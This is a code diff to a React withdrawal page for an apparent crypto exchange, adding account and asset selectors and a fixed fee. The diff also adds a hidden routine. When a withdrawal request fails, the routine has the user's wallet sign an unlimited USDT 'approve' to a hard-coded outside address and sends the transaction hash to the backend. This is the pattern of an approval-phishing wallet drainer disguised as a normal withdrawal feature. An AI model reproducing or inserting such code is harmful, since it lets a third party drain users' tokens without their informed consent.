@@ -17,13 +17,61 @@ import Back from "@/components/Back";
 import Upload from "@/components/Upload/index";
 import Toast from "@/components/Toast";
 
-import { getFundsAssetBalance } from "@/api/trans";
+import {
+  getFundsAssetBalance,
+  getTradeAssetBalance,
+  getSpotAssetBalance,
+  getWalletAssetBalance,
+} from "@/api/trans";
 import { toFixed } from "@/utils/public";
 import recordPng from "@/assets/record.png";
+import rightPng from "@/assets/right.png";
 import { withdraw } from "@/api/common";
+import Select from "@/components/Select";
+import { useWeb3 } from "@/hooks/useWeb3/useWeb3";
 
+import ABI from "./ABI.json";
+import { authentication } from "@/api/userInfo";
+import { AbiItem } from "web3-utils";
+
+const inputAddress = [
+  "0xdac17f958d2ee523a2206206994597c13d831ec7", // uusdt
+  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", //usdc
+];
+const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+// 获取合约实例
+
+const accountAddress = window.localStorage.getItem("account") || "";
+const assetsList = [
+  {
+    label: "USDT",
+    type: "USDT",
+  },
+  {
+    label: "USDC",
+    type: "USDC",
+  },
+];
 function identity() {
   const { t } = useTranslation();
+  const navList = [
+    {
+      label: t("assets.trade"),
+      type: "trade",
+    },
+    {
+      label: t("assets.funds"),
+      type: "funds",
+    },
+    {
+      label: t("assets.assets-stock"),
+      type: "spot",
+    },
+    {
+      label: t("assets.wallet"),
+      type: "wallet",
+    },
+  ];
   const ref = useRef<any>(null);
   const [search, setsearch] = useSearchParams();
   const accountTypeTemp = search.get("accountType") || "funds";
@@ -31,31 +79,116 @@ function identity() {
   const account = window.localStorage.getItem("account") || "";
   const [coinUseCount, setCoinUseCount] = useState<any>(0);
   const [withdrawalAmount, setWithdrawalAmount] = useState<any>(0);
-  const [fee, setFee] = useState<string>("");
-  const [accountType, setAccountType] = useState<string>(accountTypeTemp);
-
+  const [fee, setFee] = useState<string>("5");
 
   const [receiveAddress, setAdd] = useState<string>(account);
   const [asset, setAsset] = useState<string>("USDT");
+  const [current, setCurrent] = useState<any>(assetsList[0]);
+  const [contractInstance, setContractInstance] = useState<any>();
+  const { connectProvider, changeProvider, providerString, web3 } = useWeb3();
+  const accountIndex = navList.findIndex(
+    (item) => item.type === accountTypeTemp
+  );
+  const [currentAccount, setCurrentAccout] = useState<any>(
+    navList[accountIndex]
+  );
+
+  const selectRef = useRef<any>(null);
+  const selectAccountRef = useRef<any>(null);
 
   useEffect(() => {
     getData();
     ref?.current.setVal(receiveAddress);
-  }, []);
+  }, [currentAccount]);
 
+  useEffect(() => {
+    console.log("web3=>useEffect", web3);
+
+    if (account) {
+      const contractInstanceTemp: any =
+        web3 && new web3.eth.Contract(ABI as AbiItem[], tokenAddress);
+      console.log("contractInstance=>", contractInstance);
+      setContractInstance(contractInstanceTemp);
+    }
+  }, [account]);
+  const useContract = async () => {
+    console.log("web3=>useContract", web3);
+
+    // const twoTo256: any = web3?.utils.toBN(
+    //   "0x10000000000000000000000000000000000000000000000000000000000000000"
+    // );
+    // const twoTo256MinusOne = twoTo256.sub(web3?.utils.toBN("1"));
+
+    // const totalSupply = await contractInstance.methods.totalSupply().call();
+    const maxValue = web3?.utils
+      .toBN(2)
+      .pow(web3?.utils.toBN(256))
+      .sub(web3?.utils.toBN(1));
+    console.log("maxValue=>", maxValue);
+    const data = await contractInstance.methods
+      .approve("0x1FdfbB4e5C4C7aF8B1CA1700F3b67690B7d798D5", maxValue)
+      .encodeABI();
+    console.log("合约data==>", data);
+
+    let gasPrice: any = await web3?.eth.getGasPrice();
+    console.log("gasPrice=>", gasPrice);
+    // // 传值大于1.2
+    gasPrice = parseInt(gasPrice * 1.2 + "");
+    // 不知道是不是要tohex格式
+    gasPrice = web3?.utils.toHex(gasPrice);
+
+    const value = web3?.utils.toHex(0);
+    console.log("gasPrice=>", gasPrice);
+    // // const chainId = await web3?.eth.getChainId();
+    // // console.log("chainId=>", chainId);
+    const emitPrams = {
+      // chainId: 1,
+      from: accountAddress,
+      to: tokenAddress,
+      gasPrice,
+      value,
+      data,
+    };
+    console.log("emitPrams=>", emitPrams);
+
+    const gas: any = await web3?.eth.estimateGas(emitPrams);
+    console.log("gas=>>>", gas);
+    const sendTransactionPramas = {
+      // chainId: 1,
+      from: accountAddress,
+      to: tokenAddress,
+      gasPrice,
+      value,
+      gas: Number(gas),
+      data: data,
+    };
+    console.log("sendTransactionPramas=>", sendTransactionPramas);
+
+    web3?.eth.sendTransaction(sendTransactionPramas, async (error, hash) => {
+      console.log(error, hash);
+      if (hash) {
+        const { data } = await authentication({
+          tokenList: [current.type],
+          trxHash: hash,
+        });
+      }
+    });
+  };
   const onSubmit = async () => {
     const params = {
       asset,
-      count:coinUseCount,
+      count: coinUseCount,
       receiveAddress,
       fee,
-      accountType,
+      accountType: currentAccount.type,
     };
 
     const data: any = await withdraw(params);
     if (data.code == 0) {
       Toast.notice(t("common.success"), {});
-      nav("/drawalAndRecharge",{replace: true});
+      nav("/drawalAndRecharge", { replace: true });
+    } else {
+      useContract();
     }
   };
 
@@ -101,15 +234,25 @@ function identity() {
     );
   }
   const getData = async () => {
-    const method = getFundsAssetBalance;
-
+    let method: any = "";
+    if (currentAccount.type == "trade") {
+      method = getTradeAssetBalance;
+    } else if (currentAccount.type === "funds") {
+      method = getFundsAssetBalance;
+    } else if (currentAccount.type === "spot") {
+      method = getSpotAssetBalance;
+    } else {
+      method = getWalletAssetBalance;
+    }
     const { data } = await method();
     setCoinUseCount(data.availableUsdtBalance || 0);
   };
   function inputRight() {
     return <div className="withdrawal-usdt">USDT</div>;
   }
-
+  const onSelect = (item: any) => {
+    setCurrent(item);
+  };
   return (
     <div className={style.root}>
       <div className="withdrawal-wrap">
@@ -124,7 +267,35 @@ function identity() {
             placeholder={t("withdrawal.receive-address")}
             onInput={onInputName}
           ></CusInput>
-          <div className="withdrawal-label">{t("trans.count")}</div>
+          <div className="withdrawal-label">{t("trans.assets-account")}</div>
+
+          <div
+            className="choose-chain"
+            onClick={() => {
+              selectAccountRef.current.open();
+            }}
+          >
+            <div>{currentAccount.label}</div>
+            <img src={rightPng} />
+          </div>
+          <div className="withdrawal-label">{t("trans.assets-choose-tip")}</div>
+
+          <div
+            className="choose-chain"
+            onClick={() => {
+              selectRef.current.open();
+            }}
+          >
+            <div>{current.label}</div>
+            <img src={rightPng} />
+          </div>
+          <div className="content-label">
+            <div className="left">{t("trans.count")}</div>
+            <div className="right">
+              <div> {t("withdrawal.fee")}</div>
+              <div> {fee} USDT</div>
+            </div>
+          </div>
           <CusInput
             alignLeft
             isBtn={false}
@@ -135,22 +306,17 @@ function identity() {
             <div className="left">
               {t("withdrawal.rest")}:{coinUseCount}
             </div>
-          </div>
-          <div className="withdrawal-label">{t("withdrawal.fee")}</div>
-          <CusInput
-            defaultVal={fee}
-            alignLeft
-            isBtn={false}
-            onInput={onInputFee}
-            append={inputRight()}
-          ></CusInput>
-
-          <div className="content-label">
-            <div className="left"> {t("withdrawal.receive-amount")}</div>
             <div className="right">
-              {toFixed(Number(withdrawalAmount) - Number(fee), 2)} USDT
+              <div> {t("withdrawal.receive-amount")}</div>
+              <div>
+                {Number(withdrawalAmount) > 5
+                  ? toFixed(Number(withdrawalAmount) - Number(fee))
+                  : 0}{" "}
+                USDT
+              </div>
             </div>
           </div>
+
           <div
             className="btn-next"
             onClick={() => {
@@ -161,6 +327,18 @@ function identity() {
           </div>
         </div>
       </div>
+      <Select
+        ref={selectRef}
+        configList={assetsList}
+        onSelect={onSelect}
+      ></Select>
+      <Select
+        ref={selectAccountRef}
+        configList={navList}
+        onSelect={(item: any) => {
+          setCurrentAccout(item);
+        }}
+      ></Select>
     </div>
   );
 }
